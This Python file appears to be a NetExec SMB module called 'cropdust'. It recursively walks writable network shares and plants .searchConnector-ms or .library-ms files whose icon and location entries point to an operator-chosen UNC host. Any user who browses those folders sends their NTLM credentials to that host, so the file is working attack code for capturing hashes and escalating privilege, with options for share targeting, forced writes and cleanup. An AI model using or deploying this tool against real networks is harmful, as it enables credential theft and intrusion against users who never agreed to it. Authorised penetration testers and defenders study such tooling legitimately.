import ntpath
import tempfile


class CropDuster:
    def __init__(
        self,
        smb,
        logger,
        filename,
        scfile_path,
        url,
        cleanup,
        type,
        share,
        folder,
        force):

            
        self.smb = smb
        self.host = self.smb.conn.getRemoteHost()
        self.max_connection_attempts = 5
        self.logger = logger
        self.filename = filename
        self.scfile_path = scfile_path
        self.url = url
        self.cleanup = cleanup
        self.type = type
        self.share = share
        self.folder = folder
        self.force = force


    def get_suitable_shares(self, avbl_shares):
         
        shares = []
        # if a specific share is chosen
        # this bit loops through avbl shares to find it (hopefully)
        if self.share != "All":
            for share in avbl_shares:
                share_name = share["name"]
                if share_name == self.share:
                    # found it
                    self.logger.success(f'Found share:\t{self.share}')
                    # add it to shares list
                    shares.append(share)
                    break
            # if we couldnt find the share, bail
            if not shares:
                self.logger.fail(f'Cannot find share:\t{self.share}')
                return
        # if no specific share has been chosen
        # just add all available shares
        else:
            shares = avbl_shares

        # now we've got a list of shares
        # we need writable ones that aren't admin ones
        # or if force is enabled, whichever ones were chosen    
        try:
            # our final share list
            suitable_shares = []

            # loop through the shares
            for share in shares:
                # get the names and perms
                share_perms = share["access"]
                share_name = share["name"]
                self.logger.display(f'Share "{share_name}" has perms {share_perms}')

                if share_name in ['C$', 'ADMIN$'] and self.share == "All":
                    # skip only if user did not explicitly choose a share
                    self.logger.fail(f'Share "{share_name}" not explicitly requested, skipping')
                    continue
                # if the share is writable
                # add it and move on to the next share
                if "WRITE" in share_perms:
                    self.logger.success(f'{share_name} is writable')
                    suitable_shares.append(share_name)
                    continue
                else:
                    self.logger.fail(f'Share "{share_name}" is not writable')
                        # check if force is set
                        # if it is, add to our list anyway
                    if self.force == False:
                        self.logger.display(f'Force is set to false, not adding {share_name} to list')
                        continue
                    else:
                        self.logger.display(f'Force is set to true, adding {share_name} anyway')
                        suitable_shares.append(share_name)
                        continue

            # now we've got some suitable shares
            # lets print them
            if suitable_shares:
                self.logger.display(f'Shares to use:')
                for share in suitable_shares:
                    self.logger.success(f'{share}')
                self.logger.display('')
            # quit if no suitable shares
            else:
                self.logger.fail('No suitable shares')
                return

            # check if a specific folder was chosen
            for share in suitable_shares:
                if self.folder != "All":
                    self.logger.display(f'Folder to use:')
                    self.logger.success(f'{self.folder}')
                    self.process_dirs(share, self.folder)
                else:
                    self.process_dirs(share, "\\")
                self.logger.display('')

        # some unknown error
        except Exception as e:
            self.logger.fail(f"Error enumerating shares:\t{e!s}")


    def get_dirs(self, share, folder="\\"):
        self.logger.display("Getting accessible directories")
        item_list = []
        try:
            items = self.smb.conn.listPath(share, folder + "*")
            for item in items:
                if not item.is_directory() or item.get_longname() in ['.', '..']:
                    continue

                dir_path = f"{folder}{item.get_longname()}\\"

                # check if we can list contents
                try:
                    self.smb.conn.listPath(share, dir_path + "*")
                    can_access = True
                except Exception:
                    self.logger.display(f"{dir_path} not accessible, skipping")
                    can_access = False

                if can_access:
                    item_list.append(dir_path)
                    # recurse into this dir
                    item_list.extend(self.get_dirs(share, dir_path))

        except Exception as e:
            self.logger.fail(f"Error: {e}")

        return item_list


    def process_dirs(self, share, folder):

        try:
            items = self.smb.conn.listPath(share, folder + "*")
        except Exception:
            # self.logger.display(f"{folder} not accessible, skipping")
            return

        for item in items:
            if not item.is_directory() or item.get_longname() in ['.', '..']:
                continue

            dir_path = f"{folder}{item.get_longname()}\\"

            # check access
            try:
                self.smb.conn.listPath(share, dir_path + "*")
                can_access = True
            except Exception:
                # self.logger.fail(f"{dir_path} not accessible, skipping")
                can_access = False

            if can_access:
                # drop or clean
                extension = ".searchConnector-ms" if self.type == "search" else ".library-ms"
                file_name = self.filename + extension
                remote_path = ntpath.join(dir_path, file_name)
                try:
                    if self.cleanup:
                        self.smb.conn.deleteFile(share, remote_path)
                        self.logger.success(f"Cleaned: {share}{remote_path}")
                        # self.results.setdefault(share, []).append((dir_path, "cleaned"))
                    else:
                        with open(self.scfile_path, "rb") as scfile:
                            self.smb.conn.putFile(share, remote_path, scfile.read)
                        self.logger.success(f"Dropped: {share}{remote_path}")
                        # self.results.setdefault(share, []).append((dir_path, "dropped"))
                except Exception as e:
                    if "0xc0000022 - STATUS_ACCESS_DENIED" in str(e):
                    	#self.logger.fail(f"{dir_path} not writable, skipping")
                    	pass
                    elif "0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
                        # self.logger.fail(f"{file_name} not found in {dir_path}, skipping")
                        pass
                    else:
                        self.logger.fail(f"Error in {dir_path}: {e}")
                        # self.results.setdefault(share, []).append((dir_path, "error"))

                # recurse into subdirs
                self.process_dirs(share, dir_path)



class NXCModule:

    name = "cropdust"
    description = "Recursively or selectively drop a .searchConnector-ms/.library-ms file into folder(s) on writable shares. Has a cleanup and force function"
    supported_protocols = ["smb"]
    opsec_safe = False
    multiple_hosts = True
    category = CATEGORY.PRIVILEGE_ESCALATION


    def options(self, context, module_options):
        """
        Recursively drop a .searchConnector-ms/.library-ms file into folders on writable shares.

        URL                 URL in the dropped file to call back to, format is {HOST}@{PORT} - default is "microsoft.com@80"
        SHARE               Specify a share to target - default is all writable shares EXCEPT for C$ and ADMIN$
        FOLDER              Specify a specific folder to write to - default is recursive
        FORCE               Force write attempt on chosen shares - default is False
        FILENAME            Specify the filename used WITHOUT extension - default is "Documents"
        TYPE                Specify type of file to drop (search/library) - default is "search"
        CLEANUP             Clean up dropped files - default is False
        """
        
        # cleanup
        self.cleanup = False
        if "CLEANUP" in module_options:
            self.cleanup = bool(module_options["CLEANUP"])

        # url to point to in the dropped file
        self.url = "microsoft.com"
        if "URL" in module_options:
            self.url = str(module_options["URL"])

        # the name of the file
        self.filename = "Documents"
        if "FILENAME" in module_options:
            self.filename = str(module_options["FILENAME"])

        # chosen share
        self.share = "All"
        if "SHARE" in module_options:
            self.share = str(module_options["SHARE"])
        
        # chosen folder
        self.folder = "All"
        if "FOLDER" in module_options and "SHARE" not in module_options:
            context.log.fail("SHARE option is required when specifying folder")
            quit()
        elif "FOLDER" in module_options and "SHARE" in module_options:
            self.folder = str(module_options["FOLDER"])

        # force
        self.force = False
        if "FORCE" in module_options:
            self.force = bool(module_options["FORCE"])
        
        # type
        self.type = "search"
        if "TYPE" in module_options:
            self.type = str(module_options["TYPE"])
        if self.type == "search":
            self.scfile_path = f"{self.filename}.searchConnector-ms"
            # if we aren't doing cleanup, create a local search connector file in temp directory
            if not self.cleanup:
                self.scfile_path = f"{tempfile.gettempdir()}/{self.filename}.searchConnector-ms"
                with open(self.scfile_path, "w") as scfile:
                    scfile.truncate(0)
                    scfile.write('<?xml version="1.0" encoding="UTF-8"?>')
                    scfile.write('<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">')
                    scfile.write("<description>Microsoft Outlook</description>")
                    scfile.write("<isSearchOnlyItem>false</isSearchOnlyItem>")
                    scfile.write("<includeInStartMenuScope>true</includeInStartMenuScope>")
                    scfile.write(f"<iconReference>\\\\{self.url}\\searchCon.ico</iconReference>")
                    scfile.write("<templateInfo>")
                    scfile.write("<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>")
                    scfile.write("</templateInfo>")
                    scfile.write("<simpleLocation>")
                    scfile.write(f"<url>\\\\{self.url}\\SearchOutlook</url>")
                    scfile.write("</simpleLocation>")
                    scfile.write("</searchConnectorDescription>")
        elif self.type == "library":
            self.scfile_path = f"{self.filename}.library-ms"
            # if we aren't doing cleanup, create a local search connector file in temp directory
            if not self.cleanup:
                self.scfile_path = f"{tempfile.gettempdir()}/{self.filename}.library-ms"
                with open(self.scfile_path, "w") as scfile:
                    scfile.truncate(0)
                    scfile.write('<?xml version="1.0" encoding="UTF-8"?>')
                    scfile.write('<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">')
                    scfile.write("<name>@windows.storage.dll,-34582</name>")
                    scfile.write("<version>6</version>")
                    scfile.write("<isLibraryPinned>true</isLibraryPinned>")
                    scfile.write(f"<iconReference>\\\\{self.url}\\libIcon.ico</iconReference>")
                    scfile.write("<templateInfo>")
                    scfile.write("<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>")
                    scfile.write("</templateInfo>")
                    scfile.write("<searchConnectorDescriptionList>")
                    scfile.write('<searchConnectorDescription>')
                    scfile.write(f"<isDefaultSaveLocation>true</isDefaultSaveLocation>")
                    scfile.write("<isSupported>false</isSupported>")
                    scfile.write("<simpleLocation>")
                    scfile.write(f"<url>\\\\{self.url}\\LibMicrosoft</url>")
                    scfile.write('</simpleLocation>')
                    scfile.write('</searchConnectorDescription>')
                    scfile.write('</searchConnectorDescriptionList>')
                    scfile.write('</libraryDescription>')


    def on_login(self, context, connection):

        context.log.display("Started cropduster module with the following options:")
        context.log.display(f"URL:      {self.url}")
        context.log.display(f"FILENAME: {self.filename}")
        context.log.display(f"SHARE:    {self.share}")
        context.log.display(f"FOLDER:   {self.folder}")
        context.log.display(f"FORCE:    {self.force}")
        context.log.display(f"TYPE:     {self.type}")
        context.log.display(f"CLEANUP:  {self.cleanup}")

        avbl_shares = connection.shares()

        cropdust = CropDuster(
            connection,
            context.log,
            self.filename,
            self.scfile_path,
            self.url,
            self.cleanup,
            self.type,
            self.share,
            self.folder,
            self.force)

        cropdust.get_suitable_shares(avbl_shares)
